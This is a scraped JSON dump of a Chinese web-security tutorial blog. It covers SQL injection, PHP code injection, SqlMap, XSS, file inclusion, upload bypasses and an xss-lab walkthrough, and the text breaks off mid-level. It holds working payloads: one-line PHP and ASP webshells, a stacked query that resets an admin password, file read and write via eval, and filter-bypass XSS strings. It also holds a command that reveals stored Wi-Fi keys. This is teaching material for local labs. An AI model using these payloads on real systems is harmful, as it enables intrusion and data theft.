常用的数据库操作12345select version(); # 显示数据库版本select database(); # 查看当前正在使用的数据库select user(); # 查看使用当前数据库的用户select @@datadir; # 查看数据库路径select @@version_compile_os # 查看数据库安装的操作系统 渗透过程中使用的数据库和表information_schema ，是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等 SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表 TABLES表：提供了关于数据库中的表的信息（包括视图） COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。 常用构造注入方法使用union语句，select 1,2 union select 1,2 SQL注入类型按网络协议分 get注入 post注入 按注入的方式分 Boolean-based blind SQL injection（布尔型注入） 例如： http://test.com/view?id=1 and substring(version(),1,1)=5 UNION query SQL injection（可联合查询注入）, 例如：使用union语句，select 1,2 union select 1,2 Time-based blind SQL injection（基于时间延迟注入）， 例如：使用sleep(3)函数，select * from user where id= ‘4’ and sleep(3) Error-based SQL injection（报错型注入） Stacked queries SQL injection（可多语句查询注入）","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"web安全之SQL注入-其他方式","slug":"web安全之SQL注入-其他方式","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-24T01:23:36.256Z","comments":true,"path":"2020/12/31/web安全之SQL注入-其他方式/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F/","excerpt":"","text":"堆叠注入（Stacked Injections）一堆SQL 语句(多条)一起执行。 在MySQL 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。 堆叠注入和union injection（联合注入）有什么区别？union injection是有限的，受到前面一个查询的影响。而堆叠注入不影响 但是堆叠注入本身也有局限性： 并不是每一个环境下都可以执行，很可能受到API或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题。 真实环境中：通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的 相关APImysqli_multi_query 及mysqli_use_result 案例12http://127.0.0.1:81/vulnerabilities/sqli/?id=1&#x27;; update users set password=e10adc3949ba59abbe56e057f20f883e&#x27; where user_id=1; -- &amp;Submit=Submit## 使用堆叠注入，对admin账户的password进行更新。 OOB注入-带外通道技术（Out-Of-Band）带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用没有直接回显的漏洞。 这一类漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。 带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。 宽字节注入在数据库使用了宽字符集而web中没有考虑这个问题。character_set_client（客户端的字符集）和character_set_connection（连接层的字符集）不同，或转换函数如iconv、mb_convert_encoding使用不当 当存在宽字节注入的时候，注入参数里带入%DF,即可把\\（%5C）吃掉,，让&#39;重新出现 比如对以下url进行注入 http://ip/test/index.php?id=1 当提交，id=1&#39; and 1=1%23 mysql运行的SQL语句为 select * from user where id = &#39;1\\&#39; and 1=1#&#39; 很明显没有注入成功，而当我们提交,id=1%df&#39; and 1=1%23 mysql运行的SQL语句为 select * from user where id = &#39;1䞫&#39; and 1=1#&#39; 我们这里的宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\\也就是％5c中变成了一个汉字“运”，而“逃逸了出来。 解决办法统一数据库，web应用的字符集，避免解析产生差异。或者使用mysql_real_escape_string和mysql_set_charset，对数据进行正确的转义。","categories":[],"tags":[{"name":"堆叠注入、OOB注入","slug":"堆叠注入、OOB注入","permalink":"http://yejuns.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E3%80%81OOB%E6%B3%A8%E5%85%A5/"}]},{"title":"web安全之php代码注入","slug":"web安全之RCE-php代码注入","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-30T09:18:13.392Z","comments":true,"path":"2020/12/31/web安全之RCE-php代码注入/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE-php%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/","excerpt":"","text":"PHP代码注入代码执行（注入）类似SQL 注入漏洞，SQL注入 是将SQL 语句注入到数据库中执行，而代码执行则是可以把代码注入到应用中最终由服务器运行它。这样的漏洞如果没有特殊的过滤，相当于直接有一个Web 后门的存在。 存在的原因 程序中含有可以执行PHP 代码的函数或者语言结构 传入第一点中的参数，客户端可控，直接修改或者影响 相关函数和语句 eval() 测试代码如下 1234567&lt;?phpif(isset($_REQUEST[&#x27;code&#x27;]))&#123; @$str=$_REQUEST[&#x27;code&#x27;]; eval($str);&#125;?&gt; 提交变量?code=phpinfo();或者?code=${phpinfo()};或者?code=1;phpinfo(); assert() assert() 同样会作为PHP 代码执行 其他的跟eval()类似 preg_replace() preg_replace() 函数作用是对字符串进行正则处理, preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int limit = -1[,int &amp;$count]]) 搜索$subject 中匹配$pattern 的部分，以$replacement 进行替换，而$pattern处，及第一个参数存在e 修饰时，$replacement 的值会被当成PHP 代码来执行 call_user_func() call_user_func() 等函数都有调用其他函数的功能，其中一个参数作为要调用的函数名，那如果这个传入的函数名可控，那就可以调用以外的函数来执行我们想要的代码，也就是存在任意代码执行漏洞 1234567 &lt;?php if(isset($_GET[&#x27;fun&#x27;]))&#123; $fun=$_GET[&#x27;fun&#x27;]; $para=$_GET[&#x27;para&#x27;]; call_user_func($fun,$para); &#125;?&gt; 提交参数?fun=assert&amp;amp;para=phpinfo() 动态函数$a($b) 由于PHP 的特性原因，PHP 的函数支持直接由拼接的方式调用，这导致PHP 再安全上的控制又加大了难度。不少知名程序也用到了动态函数的写法，这种写法跟使用call_user_func() 的初衷一样，用来更加方便的调用函数，但是一旦过滤不严格就会造成代码执行漏洞 1234567&lt;?phpif(isset($_GET[&#x27;a&#x27;]))&#123; $a=$_GET[&#x27;a&#x27;]; $b=$_GET[&#x27;b&#x27;]; $a($b);&#125;?&gt; 提交参数?a=assert$b=phpinfo() 漏洞利用 直接获取shell 提交参数[?code=@eval($_REQUEST[1])],即可构成一句话木马，密码为[1]。可以使用菜刀连接 获取当前文件的绝对路径 __FILE__ 是PHP 预定义常量，其含义为当前文件的路径。提交代码?code=print(__FILE__); 读文件 可以利用file_get_contents() 函数读取服务器任意文件，前提是知道文件的绝对路径(也可是相对路径)和读取权限。比如，?code=var_dump(file_get_contents(&#39;c:\\windows\\system32\\drivers\\etc\\hosts&#39;)); 写文件 可以利用file_put_contents() 函数写入文件，前提是知道可写文件目录,比如 ?code=var_dump(file_put_contents($_POST[1],$_POST[2])); 同时需要通过post方式提交参数1=shel.php&amp;2=&lt;?php phpinfo()?&gt; 防御方法 尽量不要使用eval(不是函数，是语言结构) 等函数 如果使用的话一定要进行严格的过滤 preg_replace 放弃使用/e 修饰符 修改配置文件 disable_functions=assert","categories":[],"tags":[{"name":"web、php、注入、RCE","slug":"web、php、注入、RCE","permalink":"http://yejuns.github.io/tags/web%E3%80%81php%E3%80%81%E6%B3%A8%E5%85%A5%E3%80%81RCE/"}]},{"title":"web安全之SQL注入-报错注入","slug":"web安全之SQL注入-报错注入","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-07T08:21:50.885Z","comments":true,"path":"2020/12/31/web安全之SQL注入-报错注入/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"","text":"报错注入（Error based Injection）一种SQL注入的类型，用于使SQL 语句报错的语法，用于注入结果无回显但错误信息有输出的情况。返回的错误信息即是攻击者需要的信息。 MySQL报错注入主要分为以下几类 BigInt 等数据类型溢出； Xpath 语法错误； count() + rand() + group_by() 导致重复； 空间数据类型函数错误。 会导致MySQL报错的函数 floor 函数； extractvalue 函数；（最多32字符） updatexml 函数； exp() 函数； 常用构造注入方法使用union语句，select 1,2 union select 1,2 SQL注入类型","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"web安全之SqlMap","slug":"web安全之SqlMap使用","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-21T11:18:11.338Z","comments":true,"path":"2020/12/31/web安全之SqlMap使用/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSqlMap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"SqlMapSqlMap是一个开源的测试渗透工具，可以用来自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。 简单示例123456789101112131415161718sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot;#基本格式，默认使用level 1，检测全部数据库类型sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; -f --banner --dbs --users# -f表示获取对应的指纹信息（fingerPrint），--banner表示数据库的banner信息，--dbs获取对应的数据库信息，--users获取用户信息sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3#指定数据库类型是mysql，检测级别为3（共5级，级别越高，检测越全面）sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --cookie &quot;id=1&quot; --level 2#当程序有防get注入的时候，使用cookie注入。（只有level2以上才会检测cookie）sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3 -D test --tables#查询test数据库下有哪些表sqlmap -u &quot;http://127.0.0.1/Less-1/?id=1&quot; --dbms mysql --level 3 -D test -T admin --columns#查询test数据库、admin表有哪些字段 一些注意点 level level是注入测试等级，一共有5级。级别越高，检测的内容也就越多。检测级别大于等于2的时候会检测cookie的注入，检测级别大于等于3的时候会检测User-Agent和Referer是否有注入。 risk参数是风险等级 等级越高测试的语句越多比如会测试UPDATE 等等对数据库进行操作. *指定注入点 sqlmap可以自动找到URL里的参数，从而确定注入点。但在遇到一些做了伪静态的网页就无法自动识别。 /admin/1/类似这种，SQLMap就无法进行注入测试，但它实际上可能是这样的：/admin.php?id=1,它是把参数隐藏在了URL中，对于这样URL，直接在参数后面加一个*就可以： 1sqlmap -u &quot;www.baidu.com/admin/1*&quot; POST数据 在 URL后跟上你要提交的POST数据，SQLMap 也会去自动测试。 1sqlmap.py -u &quot;http://baidu.com/admin.php&quot; --data=&quot;id=1&amp;name=admin&quot; 从文件载入HTTP请求测试 使用参数：-r 可以可以理解抓个包下来，获取 HTTP 请求然后保存在文件里，然后让 SQLMap 自己去解析请求来进行注入测试。 可以从 burpsuite 上抓包下来配合 SQLMap 进行联合使用。 Google搜索进行测试 注入测试的脚本 使用参数：-tamper WAF的存在，会有很强的输入验证功能，通过一定的判断机制检测输入的内容是否含有非法攻击语句。为了绕过输入验证，达到预期的SQL注入目标，须对原本SQL语句进行同义改写，这种改写在很多情况下是莫名其妙的，但就是这莫名其妙的语句可以通过严密的WAF防守，达到数据库层面。更为神奇的是，数据库可以执行这段看似奇怪的SQL语句，实现预期的攻击。 而SQLMap自带了一个脚本库（在tamper目录下），内置的脚本库对 payload 进行了混淆，使得可以有效地规避防火墙规则","categories":[],"tags":[{"name":"SqlMap","slug":"SqlMap","permalink":"http://yejuns.github.io/tags/SqlMap/"}]},{"title":"web漏洞","slug":"web安全之XSS攻击","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-29T03:24:36.211Z","comments":true,"path":"2020/12/31/web安全之XSS攻击/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%94%BB%E5%87%BB/","excerpt":"","text":"xss攻击xss攻击可以分成3类， 反射型XSS 存储型XSS DOM型XSS 反射型XSS非持久化的，用户必须点击带有特定参数的链接才可以生效，影响范围小，只影响执行脚本的用户比如对于一个未检测xss的文本框，输入 1&lt;script&gt;alert(&quot;点击开始修复&quot;)；location.href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt; 存储型xss存储型xss是指应用程序通过web请求获取到不可信赖的数据，在未校验是否有xss的情况下就存入数据库。当下一次从数据库中获取该程序时也未对其进行过滤，页面再次执行xss。存储型xss可以持续攻击用户。存储型xss出现的位置包括，留言板、评论区、用户头像、签名、博客 DOM型XSSDOM型XSS其实是一种特殊的反射型XSS，通过JS操作DOM树动态地输出数据到页面，而不依赖将数据提交给服务器端。，最常使用的函数是document.url，document.location，document.referere. 123&lt;script&gt;document.write(&quot;&lt;script&gt;alter(0)&lt;/script&gt;&quot;)&lt;/script&gt; 反射型XSS会经过后端语言，是页面引用后端输出生效。而DOM型XSS是经过JS对DOM树直接操作后插入到页面。所以不经过WAF的检测. 突变型XSS（mXSS）攻击者的输入看似安全，但是在浏览器解析标记时发生突变。（与浏览器有关）","categories":[],"tags":[{"name":"xss、攻击","slug":"xss、攻击","permalink":"http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/"}]},{"title":"web安全之XSS蠕虫","slug":"web安全之XSS蠕虫","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-28T07:42:23.545Z","comments":true,"path":"2020/12/31/web安全之XSS蠕虫/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E8%A0%95%E8%99%AB/","excerpt":"","text":"xss蠕虫一种跨站脚本病毒，大多使用JavaScript 脚本编写，突破浏览器的安全限制，XSS 蠕虫基于社会工程学诱使用户点击访问其发出的恶意邀请链接在网站上感染访问网站的用户，受感染的用户发送含有蠕虫的内容，再感染安全的用户。 XSS蠕虫一般原理 基于存储型XSS 漏洞，攻击者在Web 页面植入恶意代码。 发送伪装的邀请链接。 用户点击链接被感染。 新感染用户的向好友发送伪装的邀请链接。 Samy 蠕虫","categories":[],"tags":[{"name":"xss、攻击、蠕虫","slug":"xss、攻击、蠕虫","permalink":"http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E8%A0%95%E8%99%AB/"}]},{"title":"web安全之XSS模版注入","slug":"web安全之XSS模板注入","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-25T02:44:05.229Z","comments":true,"path":"2020/12/31/web安全之XSS模板注入/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"","text":"模版引擎模版引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，比如常用的Pug模版引擎 模版引擎便于数据与代码分离， 提供了转义功能。天生具有对XSS的防御效果。但是实际上产生了另一种问题。模版注入 模板注入服务端接受用户的输入，并将其作为Web 应用模板的一部分，即允许修改底层模板，在渲染过程中模板引擎执行用户插入的恶意内容。","categories":[],"tags":[{"name":"xss、攻击、蠕虫","slug":"xss、攻击、蠕虫","permalink":"http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E8%A0%95%E8%99%AB/"}]},{"title":"web安全之伪协议与文包含件","slug":"web安全之伪协议与文件包含","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-23T15:47:13.482Z","comments":true,"path":"2020/12/31/web安全之伪协议与文件包含/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"","text":"文件包含程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。 程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞 php中常见的文件包含函数，include(), include_once() , require_once() , fopen() , readfile() 本地包含:可以进行一些本地的文件读取 12345&lt;?php $filename = $_GET[&#x27;filename&#x27;]; include($filename);?&gt;# 如上述例子 在引用filename函数时,没有过滤，直接引用了这个函数,如果fileName这个文件是一句话木马，就会被执行 如果导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的 远程包含:可以对外网上的文件进行读取 要保证php.ini中allow_url_fopen和allow_url_include要为On，也就是打开状态，这就要引入伪协议的概念 伪协议file伪协议，通过这个协议可以对系统中的文件进行包含， 条件: allow_url_fopen:off/on allow_url_include :off/on 示例： file://[文件的绝对路径和文件名]1http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt [文件的相对路径和文件名]1http://127.0.0.1/include.php?file=./phpinfo.txt [http：//网络路径和文件名]1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt php伪协议 条件： allow_url_fopen:off/on allow_url_include :仅php://input php://stdin php://memory php://temp 需要on 作用：php:// 访问各个输入/输出流（I/O streams）， 经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。 zip:// &amp; bzip2:// &amp; zlib:// 协议 条件 allow_url_fopen:off/on allow_url_include :off/on 作用 zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等 示例 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传 1http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt phar:// 协议phar://协议与zip://类似，同样可以访问zip格式压缩包内容 1http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt data:// 协议 条件 allow_url_fopen:on allow_url_include:on 作用 自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 示例 data://text/plain, 1http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt; data://text/plain;base64, 1http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b http:// &amp; https:// 协议 条件 allow_url_fopen:on allow_url_include:on 作用 常规 URL形式，允许通过HTTP 1.0的 GET方法，以只读访问文件或资源。通常用于远程包含。 示例 1http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt","categories":[],"tags":[{"name":"伪协议、文件包含","slug":"伪协议、文件包含","permalink":"http://yejuns.github.io/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"web安全之文件上传漏洞","slug":"web安全之文件上传漏洞","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-25T08:05:54.708Z","comments":true,"path":"2020/12/31/web安全之文件上传漏洞/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"文件上传漏洞是什么？关键字：绕过 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。 简单案例在bwapp中选择文件上传漏洞的bug模式， 然后借助eval函数，制做一句话木马： 12&lt;?php @eval($_POST[&#x27;hacker&#x27;]); ?&gt;# 这里将post中上传的hacker字段取出，然后执行这个字段包含的数据 文件上传成功后，我们可以得到这个文件的地址：http://192.168.50.136/images/shell.php 因为我们的漏洞是要通过POST请求中的参数去触发，因此接下来我们通过发起POST请求，就可以拿到我们想要的内容，比如： 121、curl -d &quot;hacker=echo get_current_user();&quot; http://192.168.50.136/images/shell.php2、curl -d &quot;hacker = echo getcwd();&quot; http://192.168.50.136/images/shell.php PHP中，get_current_user可以获取当前的用户，getcwd()获取当前的目录 当然，我们拿到了一个shell，就可以使用集成型的工具去做进一步的利用，比如使用中国菜刀。 常用的一些一句话木马12345678910&lt;%execute(request(&quot;value&quot;))%&gt; #asp&lt;?php @eval($_POST[“value”]);?&gt;&lt;%@ Page Language=&quot;Jscript&quot;%&gt; #aspx&lt;%eval(Request.Item[&quot;value&quot;])%&gt; &lt;%eval request(&quot;value&quot;)%&gt;&lt;%execute request(&quot;value&quot;)%&gt;&lt;%execute(request(&quot;value&quot;))%&gt; 文件上传漏洞的绕过上面的例子只是简单的举例，在实际生活中不可能存在这样的漏洞给我们直接去利用，比如会有对.php、js文件的检测，这时候我们就要用各种方法去绕过检测机制 我们首先将bwapp的漏洞难度改成medium,然后会发现不能再用同样地方式上传文件。 我们只需要将shell.php改名为shell.php3，然后就可以正常上传，和上面一样，我们用相同的一句话木马，也就是说，php3文件是可以被php解释器解析，原因在于，php的解释器配置文件中，有这样一行代码： 1FilesMatch &quot;.+\\.ph(p[345]?|t|tml)$&quot;&gt; 也就是说，对于php3，php4,php5，phptml等文件，都是可以正常解析的。 大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如：Apache 在1.x和2.x版本中存在解析漏洞，因为Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析。 漏洞利用流程： 上传shell.php.test； 访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。 1、前端验证绕过原因：很多网站、CMS 都有使用，只在前端利用JavaScript 来做校验。 漏洞利用流程（两种方法都可以）: 通过Burp Suite抓包，然后修改内容后放行。 通过Chrome禁止/删除JavaScript代码. 2、.htaccess绕过.htaccess文件（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。 场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤。 3、大小写绕过如果我们想上传一个php木马，那么我们可以上传一个pHp即可 4、windows文件流特性绕过NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。 5、%00截断绕过即对于白名单的方式，如何绕过？ 可以对上传的文件名中加入十六进制的00，这样就可以将test.php.png截断成test.php。 文件头检测绕过我们可以拼接png与php文件，尝试执行。 需要注意的是，在拼接png文件时，我们需要将png文件中大部分的信息删除，只保留那些最基本的文件信息，防止出现php无法解析特殊字符的情况。","categories":[],"tags":[{"name":"xss、攻击","slug":"xss、攻击","permalink":"http://yejuns.github.io/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/"}]},{"title":"windows常用命令","slug":"windows常用命令","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-20T07:11:48.110Z","comments":true,"path":"2020/12/31/windows常用命令/","link":"","permalink":"http://yejuns.github.io/2020/12/31/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"进程相关查看指定端口的使用情况（就可以获取端口上运行程序的PID）1netstat -ano | findstr 端口号 获取到PID后，就查看进程详细信息1tasklist | findstr 进程号 就可以知道启动该进程的程序，比如java.exe，然后使用任务管理器将其关闭 执行此命令强制关闭指定进程号的进程（类似linux中的kill）1taskkill -PID 进程号 -F 查看wifi密码1netsh wlan show profile * key=clear","categories":[],"tags":[{"name":"windows，指令","slug":"windows，指令","permalink":"http://yejuns.github.io/tags/windows%EF%BC%8C%E6%8C%87%E4%BB%A4/"}]},{"title":"xss-lab-master靶场题解思路","slug":"xss-lab-master-靶场题解思路","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-01T13:46:19.731Z","comments":true,"path":"2020/12/31/xss-lab-master-靶场题解思路/","link":"","permalink":"http://yejuns.github.io/2020/12/31/xss-lab-master-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AF/","excerpt":"","text":"XSS靶场训练这里我们选择的是xss-lab-master靶场，可以直接下载docker镜像，在本地运行。 level 1当前页面没有任何的提示信息，从URL中可以猜测是通过参数name直接注入 注入语句 1http://127.0.0.1/level1.php?name=&lt;script&gt;alert(12)&lt;/script&gt; 后台源码 12345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt; level 2当前页面只有一个文本框，先在文本框中输入&lt;script&gt;alert(12)&lt;/script&gt;, 发现没有效果。可能是对输入进行了转义。但由于输入框并不会对输入的语句清空，因此我们可以尝试闭合&lt;input&gt;标签 注入语句 1http://127.0.0.1/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 后台源码 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str.&#x27;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; level 3尝试使用level 2的语句注入，发现不能成功。那可能是对文本框内的内容也进行了转义，尝试通过事件标签触发表单执行注入语句 1http://127.0.0.1/level3.php?keyword=&#x27;οnmοuseοver=&#x27;alert(&#x27;xss&#x27;) 后台源码 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt; &lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; 从源码中可以看到，因为是在标签内部，所以可以使用属性注入，常用的属性 level 4先用测试语句&#39;&#39;;!--&quot;&lt;xss&gt;=&amp;&#123;()&#125;看看有没有过滤，然后先看看源码 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 可以看到对 &gt; &lt; 进行了替换，但忽略了&#39; ,因此可以绕过 1http://127.0.0.1/level4.php?keyword=&quot;οnmοuseοver=&#x27;alert(12)&#x27;&quot; 伪协议后台代码 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 由于对script、on都进行了处理，因此使用javascript伪协议以及标签进行注入，javascript伪协议：在此 1http://127.0.0.1/level4.php?keyword=&quot;&gt;&lt;a href=&#x27;javascript:alert(/xss/)&#x27;&gt;xss&quot; 伪协议123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 可以看到对 &gt; &lt; 进行了替换，但忽略了&#39; ,因此可以绕过 1http://127.0.0.1/level5.php?keyword=&quot;οnmοuseοver=&#x27;alert(12)&#x27;&quot; 大小写绕过后台代码 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 